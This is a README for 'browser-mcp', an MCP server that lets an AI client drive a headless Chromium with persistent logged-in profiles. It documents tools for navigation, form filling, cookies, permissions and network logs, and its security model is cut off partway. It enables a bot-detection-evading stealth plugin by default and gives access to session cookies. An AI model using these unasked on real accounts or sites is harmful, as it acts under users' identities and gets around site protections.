# browser-mcp

A Model Context Protocol server that gives Claude (or any MCP client) a full
browser — open pages, read content, click, type, take screenshots, inspect the
accessibility tree, manage tabs, and emulate devices. Powered by Playwright
with stealth mode and persistent cookie/localStorage profiles. HTTP transport,
runs as a daemon in its own process.

```
Claude Code ──HTTP──▶  browser-mcp  ──Playwright──▶  Chromium (headless)
                       │
                       ├── MCP sessions (per-client McpServer + transport)
                       ├── named profiles (persistent cookies / localStorage)
                       ├── BrowserContext per profile (reused by sessions)
                       ├── 25 tools: open / read / click / type / snapshot / …
                       └── network ring, AX snapshot store, CSRF-hardened HTTP
```

> **Disclaimer:** This tool automates browser interactions and may violate the
> terms of service of websites it accesses. You are solely responsible for how
> you use it and which sites you interact with. The authors assume no liability
> for any consequences arising from its use.

---

## Contents

- [Why](#why)
- [Quick start](#quick-start)
- [Features](#features)
- [Named profiles](#named-profiles)
- [Tools reference](#tools-reference)
- [Configuration](#configuration)
- [Architecture](#architecture)
- [Security model](#security-model)
- [Testing](#testing)
- [Docker](#docker)
- [Platform notes](#platform-notes)
- [Development](#development)
- [FAQ](#faq)
- [License](#license)

---

## Why

Claude Code's built-in `WebFetch` can grab a URL as text, but it's a one-shot:
no clicks, no form fills, no cookies, no state. For anything beyond "paste
this article":

- **Log into the site, then do X.** browser-mcp keeps cookies/localStorage on
  disk in a named profile, so an authenticated session survives restarts. Log
  in once via `browser_open_visible`, come back headless tomorrow.
- **"What's on this SPA right now?"** `browser_snapshot` returns the
  accessibility tree (role, name, value, state) via Chrome DevTools Protocol.
  Much more reliable than scraping Markdown on a React dashboard.
- **Form-driven workflows.** `browser_click`/`browser_type` use Playwright's
  auto-waiting with role/label locators — stable across markup changes, no CSS
  selectors to maintain. `browser_expect` retries assertions up to a timeout,
  so you don't have to weave waits manually.
- **Capture evidence.** `browser_save` writes PDF / MHTML / raw HTML;
  `browser_screenshot` captures viewport/full-page/element. Useful for the
  "show me what the page looked like when you filed the bug" handoff.
- **Debug SPA behaviour.** `browser_network_log` exposes a ring buffer of the
  last 500 requests — URL, method, status, timing, failure reason — so you
  can find the 401 the page silently swallowed.
- **Agent-friendly surface.** Role-based locators + accessibility snapshots
  mean the model doesn't have to invent CSS selectors or guess the markup.

---

## Quick start

### 1. Install

```bash
# Published package (preferred)
npm install -g @graphmemory/browser-mcp
browser-mcp

# Or without install
npx -y @graphmemory/browser-mcp

# Or Docker (see "Docker" below for auth requirements)
docker run --rm -p 7777:7777 -e BROWSER_MCP_API_KEY=$(openssl rand -hex 32) \
  ghcr.io/graph-memory/browser-mcp:latest
```

Chromium is installed automatically on first run (`postinstall` hook).

Boot log:

```
browser-mcp listening on http://127.0.0.1:7777/mcp
  health       → http://127.0.0.1:7777/health
  /mcp         → default profile
  /mcp/<name>  → named profile (e.g. /mcp/test1)
  auth         → DISABLED (loopback only)
  cors_origin  → null
  max_sessions → 50
```

### 2. Register in Claude Code

Add to `~/.claude.json` (user-global) or `.mcp.json` (project-local):

```json
{
  "mcpServers": {
    "browser": {
      "type": "http",
      "url": "http://127.0.0.1:7777/mcp"
    }
  }
}
```

With auth (required when bound to a non-loopback interface):

```json
{
  "mcpServers": {
    "browser": {
      "type": "http",
      "url": "http://127.0.0.1:7777/mcp",
      "headers": { "Authorization": "Bearer ${BROWSER_MCP_API_KEY}" }
    }
  }
}
```

### 3. First conversation

Ask Claude in plain language:

> Open example.com, find the "Sign in" link, read the resulting page, and
> fill the email field with test@example.com.

It will sequence `browser_open` → `browser_click` → `browser_read` →
`browser_type` for you. Keep iterating without leaving the conversation.

### 4. Sample flow (what the tools actually look like)

```
browser_open          { url: "https://example.com" }
browser_snapshot      { compact: true }                   # what can I click/type
browser_click         { target: "Sign in", target_type: "role", role: "button" }
browser_type          { target: "Email", target_type: "label", text: "a@b.co" }
browser_expect        { assertion: "url_matches", expected: "/dashboard$" }
browser_read          { mode: "markdown" }

browser_save          { format: "pdf", path: "./dashboard.pdf" }
browser_network_log   { failed_only: true, limit: 20 }
browser_cookies       { action: "get", urls: ["https://example.com/"] }
```

---

## Features

- **25 tools** covering navigation, reading, interaction, assertions, IO,
  network inspection, cookies, permissions, and device emulation. See the
  [Tools reference](#tools-reference).
- **Persistent named profiles.** Each URL path (`/mcp/<name>`) gets its own
  cookies and localStorage under `~/.browser-mcp/profiles/<name>/`. Log in
  once; restart the supervisor or Claude Code; the session is still there.
- **Accessibility-first.** `browser_snapshot` pulls the AX tree from Chrome
  DevTools Protocol (Playwright 1.40 removed the built-in AX API). Compact
  mode strips decorative containers and keeps only interactive elements plus
  landmarks — perfect for agents that need "what can I click" without reading
  React-generated DOM noise.
- **Diffable snapshots.** `browser_snapshot { store_as: "before" }` → do
  something → `{ diff_against: "before" }` returns added/removed/state-changed
  nodes as a compact diff. Auto-compact to suppress spurious noise.
- **Role/label locators.** Every interact tool accepts
  `target_type: role|label|text|placeholder|testid|selector`. Prefer `role`
  for buttons/links and `label` for form fields — robust against markup
  changes, zero CSS maintenance.
- **`browser_expect` with retry.** 13 assertion kinds (visible/hidden/enabled/
  disabled, text_equals/contains/matches, value_equals, count,
  url_equals/matches, title_equals/matches). Retries up to a timeout so you
  don't need a separate `browser_wait` for flaky conditions.
- **`browser_read` with compact mode.** Markdown/text/HTML extraction; the
  optional `compact` flag strips nav/header/footer/aside/script/style/iframe
  and ARIA landmark chrome. Automatic on text/html (pages would otherwise be
  drowned in boilerplate); off on markdown (Readability already picks the
  article).
- **Network ring buffer.** 500 most recent requests per profile, across all
  tabs. Filter by tab, URL regex, method, min_status, or failed_only.
  Surfaces the 4xx/5xx the UI quietly swallowed.
- **Visible mode for login.** `browser_open_visible` shuts down the headless
  context and reopens in a visible window for manual interaction (CAPTCHAs,
  SSO, 2FA). Cookies land in the persistent profile; closing the window
  returns to headless.
- **Device emulation.** `browser_configure` applies viewport/DSR/UA/mobile/
  locale/color-scheme presets. Named `device_preset` (iphone-15, ipad-pro,
  pixel-8, desktop-retina…) applies a full profile atomically.
- **File IO.** `browser_save` writes PDF (headless only)/MHTML/HTML;
  `browser_upload` wires `<input type=file>` with path validation;
  `browser_download_wait` captures a download triggered by click or
  navigation, honours server-suggested filename.
- **Stealth plugin.** `playwright-extra` + `puppeteer-extra-plugin-stealth`
  applied by default. Disable with `--no-stealth` if it breaks a specific
  site.
- **Supervisor-env isolation.** All `BROWSER_MCP_*` vars (API key, host, caps)
  are filtered out of Chromium's env so page scripts can't fingerprint the
  supervisor configuration.
- **CSRF-hardened HTTP.** `Content-Type: application/json` required, `Origin`
  header whitelist, API key compared with `crypto.timingSafeEqual`.
- **Refuse-to-start safety.** Bound to a non-loopback interface without an
  API key? Exits with code 2 and an explanation. Override with
  `--allow-insecure` if you know what you're doing.
- **Session + tab TTL.** Idle MCP sessions reaped after `session_ttl`
  (default 30 min); inactive tabs auto-closed after `tab_ttl` (default 10 min).
  Hard cap on concurrent sessions (`max_sessions`, default 50).
- **Multi-arch Docker image.** linux/amd64 + linux/arm64, non-root `browser`
  user, `tini` as PID 1 for zombie reaping, healthcheck wired to `/health`.
- **Full test suite.** 304 tests (unit + integration against a real headless
  Chromium) covering every tool handler, the HTTP server (auth/CSRF/session
  lifecycle), and the AX-tree pipeline. See [Testing](#testing).

---

## Named profiles

Each MCP endpoint URL can include a profile name that isolates cookies,
localStorage, and browser state:

```
http://127.0.0.1:7777/mcp            → "default" profile
http://127.0.0.1:7777/mcp/test1      → "test1" profile
http://127.0.0.1:7777/mcp/my-scraper → "my-scraper" profile
```

Profile names must match `^[a-zA-Z0-9_-]{1,64}$` (letters, digits, dashes,
underscores; 1–64 chars) — validated at the HTTP layer so path traversal can't
escape the base directory.

Profiles are stored at `~/.browser-mcp/profiles/<name>/` (override with
`--profile-dir` or `BROWSER_MCP_PROFILE_DIR`).

Multiple MCP sessions on the same profile share one `BrowserContext`. When the
last session on a profile expires, the context shuts down and Chromium exits.

### Multi-profile Claude Code config

```json
{
  "mcpServers": {
    "browser": {
      "type": "http",
      "url": "http://127.0.0.1:7777/mcp"
    },
    "browser-test": {
      "type": "http",
      "url": "http://127.0.0.1:7777/mcp/test"
    }
  }
}
```

---

## Tools reference

All tools accept structured arguments (zod-validated). Responses are single-
block `text` content (except `browser_screenshot`, which returns `image`).

### `browser_open`

Open a URL in a new tab, or navigate an existing tab if `tab_id` is given.
Waits for DOMContentLoaded plus a short request-idle settle. Does **not**
return page content — call `browser_read` afterwards. Returns HTTP status,
final URL, title, and tab_id.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `url` | string (URL) | yes | Absolute URL to navigate to |
| `tab_id` | string | no | If set, navigate this existing tab instead of opening a new one |

### `browser_read`

Read the current (or specified) tab. `mode=markdown` (default) extracts the
main article via Mozilla Readability and converts to Markdown. `mode=text`
returns body innerText. `mode=html` returns raw HTML.

`compact=true` strips nav / header / footer / aside / script / style / svg /
iframe and ARIA landmark chrome (`banner`, `navigation`, `complementary`,
`contentinfo`, `search`) before rendering. Defaults on for `text` / `html`,
off for `markdown` (Readability already picks the article). Useful for
dashboards / SPAs where Readability bails out.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `mode` | `"markdown"` \| `"text"` \| `"html"` | no | `"markdown"` | Extraction mode |
| `selector` | string | no | — | CSS selector to narrow extraction to a specific element |
| `compact` | boolean | no | auto | Strip chrome (see above) |
| `max_chars` | integer | no | `50000` | Cap output length (also via `BROWSER_MCP_MAX_CHARS`) |
| `tab_id` | string | no | active tab | Tab to read from |

### `browser_find`

Find text occurrences on the current page. Returns up to `limit` snippets,
each with surrounding context and a stable CSS selector suitable for
`browser_click` / `browser_type`.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `query` | string | yes | — | Substring (case-insensitive) |
| `limit` | integer (1–50) | no | `10` | Max matches |
| `tab_id` | string | no | active tab | Tab to search in |

### `browser_click`

Click an element using one of several locator strategies. Playwright
auto-waits for the element to be visible, enabled, and stable; the server
additionally waits for network idle after the click.

**Strategy priority** (most → least reliable): `role` > `label` > `text` >
`placeholder` > `testid` > `selector`. Prefer `role` for buttons/links and
`label` for form fields.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `target` | string | yes | — | Description of the element (see `target_type`) |
| `target_type` | `text`\|`role`\|`label`\|`placeholder`\|`testid`\|`selector` | no | `text` | Locator strategy |
| `role` | ARIA role | no | `"button"` when `target_type="role"` | Required for role locator |
| `exact` | boolean | no | `false` | Exact match vs substring |
| `tab_id` | string | no | active tab | Tab to act on |

Examples:
```json
{ "target": "Sign in", "target_type": "role", "role": "button" }
{ "target": "Home",    "target_type": "role", "role": "link", "exact": true }
{ "target": "submit",  "target_type": "testid" }
```

### `browser_type`

Fill an input/textarea/contenteditable with text. Auto-waits for the field to
be actionable. Uses Playwright's fill semantics (existing value is replaced).
If `submit=true`, presses Enter after typing.

**Strategy priority** for forms: `label` > `placeholder` > `testid` > `selector`.
`label` is the most robust for typical forms.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `target` | string | yes* | — | Target element (see `target_type`). *Accepts `selector` for back-compat |
| `target_type` | same as click | no | `selector` | Locator strategy |
| `role` | ARIA role | no | — | For `role` locator (typically `textbox`) |
| `exact` | boolean | no | `false` | Exact match |
| `text` | string | yes | — | Text to type |
| `submit` | boolean | no | `false` | Press Enter after typing |
| `tab_id` | string | no | active tab | Tab to act on |
| `selector` | string | no | — | **Deprecated** alias for `target` with `target_type=selector` |

### `browser_expect`

Assert a condition on the page. Retries up to `timeout_ms` before failing —
no separate `browser_wait` needed for flaky conditions. Returns `PASS` or
`FAIL` with `expected` and `actual` in the error body.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `assertion` | one of 13 (see below) | yes | — | What to assert |
| `target` | string | depends | — | Element target (required for element / text / count / value assertions) |
| `target_type` | same as click | no | `selector` | Locator strategy |
| `role` | ARIA role | no | — | For `role` locator |
| `exact` | boolean | no | `false` | Exact match |
| `expected` | string \| number | depends | — | For text/value/count/url/title; for `*_matches` it's a regex |
| `timeout_ms` | integer (1–60000) | no | `5000` | Retry window |
| `tab_id` | string | no | active tab | Tab to check |

**Assertions:** `visible`, `hidden`, `enabled`, `disabled`, `text_equals`,
`text_contains`, `text_matches`, `value_equals`, `count`, `url_equals`,
`url_matches`, `title_equals`, `title_matches`.

Examples:
```json
{ "assertion": "visible", "target": "Sign in", "target_type": "role", "role": "button" }
{ "assertion": "text_contains", "target": "#status", "expected": "done" }
{ "assertion": "count", "target": "input", "expected": 3 }
{ "assertion": "url_matches", "expected": "/dashboard$" }
```

### `browser_snapshot`

Return an **accessibility snapshot** — a compact tree of semantic elements
(role, name, value, state) pulled from Chrome's accessibility API via CDP.
Much more reliable than scraping Markdown on SPAs.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `selector` | string | no | — | Scope to subtree rooted at this CSS selector |
| `max_depth` | integer (0–50) | no | — | Truncate deeper children with a `"N hidden children"` summary |
| `interesting_only` | boolean | no | `true` | Prune decorative/hidden nodes (Playwright convention) |
| `compact` | boolean | no | auto | Keep only interactive elements + structural landmarks. Auto-on when diffing |
| `store_as` | string (1–64) | no | — | Save snapshot under this name for later diffing |
| `diff_against` | string (1–64) | no | — | Return added / removed / changed vs the stored snapshot |
| `format` | `"yaml"` \| `"json"` | no | `yaml` | Output format |
| `tab_id` | string | no | active tab | Tab to snapshot |

Sample output (`yaml`) — decorative `InlineTextBox` nodes filtered,
`StaticText` children whose text matches their parent's name collapsed, and
anonymous containers (`listitem`, `cell`) inherit their text content as name:

```
- RootWebArea "Login" [focused]
  - heading "Login" [level=1]
  - textbox "Email" [required]
  - textbox "Password" [required]
  - button "Sign in"
```

Compact strips generic wrappers, keeping only what the user can interact with
plus structural anchors:

```
- form
  - textbox "Email"
  - textbox "Password"
  - button "Sign in"
```

Diff output — after `store_as: "before"` → some actions → `diff_against: "before"`:

```
── diff vs "before" ──

Added (2):
  + listitem "buy milk"
  + listitem "walk dog"

Changed (1):
  ~ button "Add"  [-] → [focused]
```

**Caveat:** the diff is path-based (role+name chain from root). Structural
changes that shift sibling order can cause spurious add/remove pairs on
otherwise-unchanged nodes. Works best for "I clicked X, what appeared" rather
than "detect exactly one element changed". Value changes on textboxes are
reported as `changed` (value is excluded from node identity).

### `browser_permissions`

Grant (or clear) browser permissions — camera, microphone, geolocation,
notifications, clipboard, etc. Use **before** navigating so the prompt never
appears.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `grant` | `"all"` \| `"none"` \| array | yes | — | Which permissions |
| `origin` | URL | no | current tab's origin | Origin to apply (http/https only) |
| `tab_id` | string | no | active tab | Tab whose origin to use |

Supported permissions: `geolocation`, `midi`, `midi-sysex`, `notifications`,
`camera`, `microphone`, `background-sync`, `ambient-light-sensor`,
`accelerometer`, `gyroscope`, `magnetometer`, `clipboard-read`,
`clipboard-write`, `payment-handler`, `storage-access`.

### `browser_save`

Save the current page to disk.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `format` | `"pdf"` \| `"mhtml"` \| `"html"` | yes | — | Output format |
| `path` | string | yes | — | Absolute or relative; parent dirs created |
| `full_page` | boolean | no | `false` | PDF only: full scrollable page |
| `landscape` | boolean | no | `false` | PDF only |
| `tab_id` | string | no | active tab | Tab to save |

- **pdf** — Chromium's native print-to-PDF. **Headless only** (Playwright limitation).
- **mhtml** — single-file archive with resources inlined. Best for offline handoff.
- **html** — raw `page.content()`.

### `browser_upload`

Upload files to an `<input type="file">`. Paths validated to exist before
the call. For `<input multiple>` pass several files; otherwise one.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `target` | string | yes | — | File input |
| `target_type` | `selector`\|`label`\|`testid` | no | `selector` | Locator strategy |
| `files` | array of paths (1–32) | yes | — | Absolute or relative; each validated to be a regular file |
| `tab_id` | string | no | active tab | Tab to act on |

### `browser_download_wait`

Trigger a download (via click or navigation) and capture the resulting file.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `action` | `click` \| `navigate` | no | `click` | How to trigger |
| `target` | string | iff click | — | Button/link that starts the download |
| `target_type` | same as click | no | `text` | Locator strategy |
| `role` | ARIA role | no | — | For role locator |
| `url` | URL | iff navigate | — | Direct download URL |
| `save_to` | string | yes | — | Path; ends with `/` or existing dir → server-suggested filename |
| `timeout_ms` | integer (1–600000) | no | `60000` | Total wait for start + complete |
| `tab_id` | string | no | active tab | Tab to act on |

### `browser_cookies`

Read, write, or clear cookies in the profile.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `action` | `get` \| `set` \| `clear` | yes | — | Operation |
| `urls` | array of URLs | no | — | `get`: scope to these URLs |
| `cookies` | array of cookie objects | iff set | — | Each needs (domain+path) or a single url. Fields: `name`, `value`, `domain`, `path`, `url`, `expires`, `httpOnly`, `secure`, `sameSite` |

### `browser_network_log`

Inspect recent network requests. Ring buffer of the last 500 per profile,
across all tabs.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `tab_id` | string | no | all tabs | Only entries from this tab |
| `limit` | integer (1–500) | no | `100` | Max entries |
| `url_regex` | string (regex) | no | — | Only URLs matching |
| `method` | HTTP method | no | — | Filter by method |
| `failed_only` | boolean | no | `false` | Only net errors (ERR_*, blocked) |
| `min_status` | integer (100–599) | no | — | Only responses with status ≥ this |

Output:
```
── 3 entries (of 47 in ring) ──
14:16:32.170  200         GET     https://api/v1/users       [xhr, 85ms]
14:16:32.220  404         GET     https://api/v1/missing     [xhr, 12ms]
14:16:32.300  FAIL(...)   POST    https://third-party/track  [fetch, 2013ms]
```

### `browser_scroll`

Scroll the current tab. `up`/`down` by `amount` pixels; `top`/`bottom` jumps.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `direction` | `up`\|`down`\|`top`\|`bottom` | no | `down` | Direction |
| `amount` | integer | no | `800` | Pixels (ignored for top/bottom) |
| `tab_id` | string | no | active tab | Tab to act on |

### `browser_back` / `browser_forward` / `browser_reload`

Navigate in history. Only `tab_id` parameter. `back`/`forward` report
`Already at earliest/latest history entry` when there's nowhere to go.

### `browser_wait`

Wait for an element to reach a given state.

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `selector` | string | yes | — | CSS selector |
| `state` | `visible`\|`hidden`\|`attached`\|`detached` | no | `visible` | Target state |
| `timeout` | integer | no | `10000` | Max wait (ms) |
| `tab_id` | string | no | active tab | Tab |

### `browser_evaluate`

Execute a JavaScript expression in the page and return the JSON-serialized result.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `expression` | string | yes | JS expression (must return JSON-serializable) |
| `tab_id` | string | no | Tab |

### `browser_tabs_list` / `browser_tab_switch` / `browser_tab_close`

List tabs (`→` marks active), switch active tab, close tab.

### `browser_open_visible`

Open a URL in a **visible** (non-headless) Chrome window for manual
interaction — login, CAPTCHA, SSO, 2FA. Cookies/localStorage land in the
persistent profile. Closing the window returns to headless mode.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `url` | string (URL) | yes | URL to open |

### `browser_screenshot`

Take a PNG screenshot. Default viewport; `full_page=true` for full scroll;
`selector` for a specific element (scrolled into view first).

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `full_page` | boolean | no | `false` | Viewport vs whole page. Ignored when `selector` set |
| `selector` | string | no | — | Capture only this element |
| `tab_id` | string | no | active tab | Tab |

Returns an `image` content block (PNG, base64).

### `browser_configure`

Change browser settings at runtime. All parameters optional — pass only what
you want to change. Some changes trigger a browser-context restart (all open
tabs are closed, response flags it).

**No-restart (per-tab):**
- `viewport_preset` — `mobile` / `tablet` / `desktop` / `desktop-hd` / `desktop-2k`
- `viewport_width` + `viewport_height` — custom
- `color_scheme` — `light` / `dark` / `no-preference`
- `tab_id` — which tab

**No-restart (context-wide):**
- `user_agent` — custom
- `ua_preset` — `chrome-desktop` / `chrome-mobile` / `safari-desktop` / `safari-mobile` / `firefox-desktop`
- `locale` — e.g. `en-US`, `ru-RU`, `ja-JP`

**Restart required:**
- `device_preset` — `iphone-15` / `iphone-se` / `ipad` / `ipad-pro` / `pixel-8` / `galaxy-s24` / `desktop-retina`
- `device_scale_factor` — e.g. 2 for retina, 3 for iPhone
- `is_mobile` — enables `isMobile` + `hasTouch`

Device presets:

| Preset | Viewport | Scale | Mobile | Touch |
|--------|----------|-------|--------|-------|
| `iphone-15` | 393×852 | 3× | yes | yes |
| `iphone-se` | 375×667 | 2× | yes | yes |
| `ipad` | 820×1180 | 2× | yes | yes |
| `ipad-pro` | 1024×1366 | 2× | yes | yes |
| `pixel-8` | 412×915 | 2.625× | yes | yes |
| `galaxy-s24` | 360×780 | 3× | yes | yes |
| `desktop-retina` | 1280×900 | 2× | no | no |

---

## Configuration

All flags are optional — loopback-only defaults work out of the box. Priority:
**CLI flag > env var > default**.

| Flag | Env | Default | Notes |
|---|---|---|---|
| `-p, --port` | `BROWSER_MCP_PORT` | `7777` | |
| `-H, --host` | `BROWSER_MCP_HOST` | `127.0.0.1` | |
| `--api-key` | `BROWSER_MCP_API_KEY` | *(off)* | **required when host ≠ loopback** |
| `--allow-insecure` | `BROWSER_MCP_ALLOW_INSECURE` | `false` | override refuse-to-start |
| `--cors-origin` | `BROWSER_MCP_CORS_ORIGIN` | `null` | comma-separated origins or `*` |
| `--max-sessions` | `BROWSER_MCP_MAX_SESSIONS` | `50` | concurrent MCP sessions |
| `--session-ttl` | `BROWSER_MCP_SESSION_TTL_SEC` | `1800` | idle session reaper (30 min) |
| `--[no-]headless` | `BROWSER_MCP_HEADLESS` | `1` | `0` = visible |
| `--[no-]stealth` | `BROWSER_MCP_STEALTH` | `1` | `playwright-extra` + stealth plugin |
| `--channel` | `BROWSER_MCP_CHANNEL` | `chrome` | Chromium channel (`chrome`, `msedge`, `chromium`) |
| `--[no-]javascript` | `BROWSER_MCP_JAVASCRIPT` | `1` | |
| `--viewport` | `BROWSER_MCP_VIEWPORT` | `1280x900` | WxH |
| `--device-scale-factor` | `BROWSER_MCP_DEVICE_SCALE_FACTOR` | `1` | |
| `--[no-]mobile` | `BROWSER_MCP_MOBILE` | `0` | |
| `--user-agent` | `BROWSER_MCP_USER_AGENT` | — | |
| `--locale` | `BROWSER_MCP_LOCALE` | — | Accept-Language |
| `--color-scheme` | `BROWSER_MCP_COLOR_SCHEME` | — | |
| `--proxy` | `BROWSER_MCP_PROXY` | — | e.g. `http://proxy:8080` |
| `--proxy-bypass` | `BROWSER_MCP_PROXY_BYPASS` | — | comma-separated domains |
| `--proxy-username` | `BROWSER_MCP_PROXY_USERNAME` | — | |
| `--proxy-password` | `BROWSER_MCP_PROXY_PASSWORD` | — | |
| `--tab-ttl` | `BROWSER_MCP_TAB_TTL_SEC` | `600` | inactive tab reaper (10 min) |
| `--max-chars` | `BROWSER_MCP_MAX_CHARS` | `50000` | cap for `browser_read` |
| `--max-html-bytes` | `BROWSER_MCP_MAX_HTML_BYTES` | `10000000` | HTML cap before JSDOM parse (OOM guard) |
| `--settle-ms` | `BROWSER_MCP_SETTLE_MS` | `500` | quiet-window duration |
| `--settle-timeout-ms` | `BROWSER_MCP_SETTLE_TIMEOUT_MS` | `3000` | hard settle timeout after nav/click |
| `--profile-dir` | `BROWSER_MCP_PROFILE_DIR` | `~/.browser-mcp/profiles` | profile base dir |

### Safety opt-ins (env only — sharp-edge escape hatches)

| Env | Default | Effect |
|---|---|---|
| `BROWSER_MCP_ALLOW_FILE_URLS` | `0` | Permit `file://` in `browser_open` / `browser_download_wait` |
| `BROWSER_MCP_ALLOW_PRIVATE_NETWORKS` | `0` | Permit loopback / RFC1918 / link-local / ULA IPs |
| `BROWSER_MCP_ALLOW_ANY_WRITE_PATH` | `0` | Disable write sandbox for `browser_save` / `browser_download_wait` |
| `BROWSER_MCP_ALLOW_ANY_UPLOAD_PATH` | `0` | Disable read sandbox for `browser_upload` |
| `BROWSER_MCP_SANDBOX_DIR` | `~/.browser-mcp` | Base dir for download / upload sandboxes |
| `BROWSER_MCP_READ_BODY_TIMEOUT_MS` | `10000` | Wall-clock cap on HTTP body read (slow-loris) |

`browser-mcp --help` prints the CLI list.

---

## Architecture

### Process topology

browser-mcp is one Node process. Each named profile lazily launches its own
Chromium (`launchPersistentContext`) on first use. Multiple concurrent MCP
sessions on the same profile share that context. When the last session on a
profile expires, the context shuts down.

### HTTP layer

Transport: `@modelcontextprotocol/sdk`'s `StreamableHTTPServerTransport` on
top of `node:http`. One TCP listener, endpoints `/mcp`, `/mcp/<profile>`, and
`/health`.

Each MCP client gets a session on `initialize` (random UUID in
`mcp-session-id`). Sessions have their own `McpServer` instance and transport.
Idle sessions are reaped after `session_ttl` via a 60 s interval timer.

Hard caps: `max_sessions` (503 on overflow), `MAX_BODY_BYTES = 1 MB` per
request, per-tool zod `.max(…)` on every user string.

Request pipeline for `/mcp`:

```
→ URL check (startsWith /mcp) + profile-name validation
→ Origin check (allowlist; unset Origin = native client, always allowed)
→ Content-Type check (POST requires application/json)
→ Auth check (Bearer, timingSafeEqual)
→ session lookup / create (cap applied on create)
→ MCP SDK transport.handleRequest
```

`src/app.ts` exports `createApp()` which returns the `http.Server` — no
side effects at import time, which makes integration testing trivial.
`src/index.ts` is a thin bootstrap that calls `createApp().httpServer.listen()`
and wires SIGINT/SIGTERM.

### BrowserManager

One instance per profile. Holds:

- The `BrowserContext` (Playwright's persistent context).
- `tabs: Map<tab_id, Page>` — 8-char nanoid per tab.
- `lastUsed: Map<tab_id, timestamp>` — drives the TTL sweeper.
- `netLog: NetLogEntry[]` — fixed-capacity ring (500 entries) fed by page
  `request`/`requestfinished`/`requestfailed` listeners.
- `snapshotStore: Map<name, AxNode>` — user-named AX snapshots for
  `browser_snapshot` diffing.
- `_overrides` — context-level settings from `browser_configure` (applied on
  next context creation).

Every 60 s the sweeper closes inactive tabs older than `tab_ttl` (the
currently-active tab is always spared).

On `shutdown()` the context is closed and all Chromium subprocesses exit.

### Accessibility snapshot pipeline

Playwright 1.40 removed `page.accessibility.snapshot()`, so browser-mcp
pulls the AX tree directly from Chrome DevTools Protocol:

```
CDP Accessibility.enable
  ├─ full tree:    Accessibility.getFullAXTree      (for top-level snapshot)
  └─ subtree:      DOM.querySelector → describeNode → getPartialAXTree
                   (with fetchRelatives, includes ancestors)
        ↓
   cdpAxToTree(nodes, interestingOnly):
     - pick the root node (parent not in the map)
     - walk childIds recursively
     - skip ALWAYS_NOISY_ROLES (InlineTextBox)
     - if interestingOnly: flatten ignored nodes
     - collect role/name/value/description + a curated property set
        ↓
   collapseRedundantText(node):
     - if parent is anonymous and has StaticText children, promote their text
       as the parent's name (gives listitem / cell / row identity)
     - drop StaticText children whose text matches parent's name exactly
        ↓
   filterCompact(node):   (if compact=true)
     - keep interactive roles (button, link, textbox, checkbox, option, …)
     - keep structural landmarks (heading, navigation, main, form, dialog,
       list, listitem, table, row, cell, …)
     - drop everything else; hoist single interesting descendants
        ↓
   renderAxNode(node):   YAML-ish output for the wire
     - "N  role "name" [attr1=v1, attr2, …]"
     - indented children
```

Diff algorithm (`diffSnapshots`):

1. Flatten both trees to `Map<path, AxNode>` where `path = /role|name/role|name/…`
   (value excluded from the signature so textbox edits don't look like
   remove+add).
2. Keys present in `after` but not `before` → `added`.
3. Keys present in `before` but not `after` → `removed`.
4. Common keys where `stateSummary(a) !== stateSummary(b)` → `changed`.
   State summary includes `value`, `checked`, `pressed`, `selected`,
   `disabled`, `expanded`, `focused`.

### Network ring buffer

```
page.on("request")         ── reqStart.set(req, { ts, tab_id })
page.on("requestfinished") ──┐
page.on("requestfailed")   ──┤── pushNet({ ts, tab_id, method, url, status?, duration_ms?, failed? })
                              ▼
                     NetLog ring (capacity 500)
```

`readNetLog` walks the ring in chronological order, applying tab/method/
failedOnly/minStatus/urlRegex filters, then slices the most recent `limit`.

### Compact render for `browser_read`

JSDOM-based. `stripCompactDom(document)` deletes nodes matching
`nav, header, footer, aside, script, style, noscript, template, svg, iframe,
[role=navigation|banner|contentinfo|complementary|search], [aria-hidden=true],
[hidden]`. Three flavours:

- `htmlToMarkdown(html, url, max, fallback, compact)` — strips, then
  Readability → turndown. Falls back to `plainTextFallback` or raw-body
  turndown when Readability bails.
- `stripCompactHtml(html, url)` — strips, returns body innerHTML.
- `stripCompactText(html, url)` — strips, inserts `\n\n` before block
  elements, collapses inline whitespace, caps blank lines.

### Shutdown

SIGINT/SIGTERM triggers:

```
1. stop accepting new HTTP connections (httpServer.close)
2. clear session reaper interval
3. close all transports + McpServer instances
4. shutdown each BrowserManager (closes Chromium)
5. process.exit(0)
```

---

## Security model

browser-mcp drives a real Chromium on your machine — anyone who can reach
`/mcp` can visit arbitrary URLs, exfiltrate logged-in session cookies, solve
CAPTCHAs in your name, and (without the guards below) read arbitrary local
files. The defaults are chosen so this can't happen by accident:

### Network-level guards

- **Refuse-to-start insecure.** Bound to a non-loopback host (`0.0.0.0`, any
  LAN IP) AND no API key set? Exit code 2 with a loud error. Override with
  `--allow-insecure` if you understand the risk (e.g. isolated VM,
  intra-Docker-network).
- **CSRF defense.** `/mcp` POSTs must carry `Content-Type: application/json`
  (not a CORS-simple type — browsers must preflight and we don't answer
  OPTIONS). If an `Origin` header is present, it must match
  `BROWSER_MCP_CORS_ORIGIN` (default **empty** — only native clients like
  curl and Claude Code, which send no `Origin`, are allowed). The literal
  string `null` in the allowlist opts in to sandboxed-iframe / `file://`
  pages and is a CSRF vector on loopback without auth — it's **not** enabled
  by default.
- **Body size + slow-loris.** 1 MB per request max; the full body must arrive
  within 10 s (or the socket is torn down). No slow-drip DoS.
